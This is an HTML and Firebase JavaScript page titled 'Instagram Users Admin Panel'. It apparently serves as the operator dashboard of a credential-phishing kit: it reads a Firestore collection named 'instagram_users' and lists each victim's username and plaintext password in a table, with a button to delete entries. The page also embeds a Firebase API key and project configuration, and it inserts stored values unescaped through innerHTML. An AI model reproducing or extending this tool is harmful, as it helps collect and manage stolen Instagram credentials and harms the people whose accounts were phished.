<!DOCTYPE html>

<html>
<head>
  <title>Admin Panel - Instagram Users</title>
  <style>
    body {
      font-family: Arial;
      background: #111;
      color: #fff;
      padding: 20px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      border: 1px solid #444;
      padding: 10px;
      text-align: center;
    }
    th {
      background: #222;
    }
    button {
      padding: 6px 12px;
      border: none;
      background: red;
      color: white;
      cursor: pointer;
      border-radius: 5px;
    }
    button:hover {
      background: darkred;
    }
  </style>
</head>
<body>

<h2>📊 Instagram Users Admin Panel</h2>

<table id="userTable">
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
      <th>Status</th>
      <th>Verified</th>
      <th>Action</th>
    </tr>
  </thead>
  <tbody></tbody>
</table>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyAcc6qlrnYArscNXN7uyZc_MG5DxLxQNOI",
  authDomain: "vega-70de0.firebaseapp.com",
  projectId: "vega-70de0",
  storageBucket: "vega-70de0.firebasestorage.app",
  messagingSenderId: "461552169149",
  appId: "1:461552169149:web:8fd04f085bafaee67cc7d4"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const tableBody = document.querySelector("#userTable tbody");

// Fetch Data
async function loadUsers() {
  tableBody.innerHTML = "";
  const querySnapshot = await getDocs(collection(db, "instagram_users"));

  querySnapshot.forEach((docSnap) => {
    const data = docSnap.data();
    const row = document.createElement("tr");

    row.innerHTML = `
      <td>${data.username}</td>
      <td>${data.password}</td>
      <td>${data.status}</td>
      <td>${data.verified}</td>
      <td><button onclick="deleteUser('${docSnap.id}')">Delete</button></td>
    `;

    tableBody.appendChild(row);
  });
}

// Delete Function
window.deleteUser = async (id) => {
  if (confirm("Delete this user?")) {
    await deleteDoc(doc(db, "instagram_users", id));
    loadUsers();
  }
};

// Load on start
loadUsers();

</script>

</body>
</html>

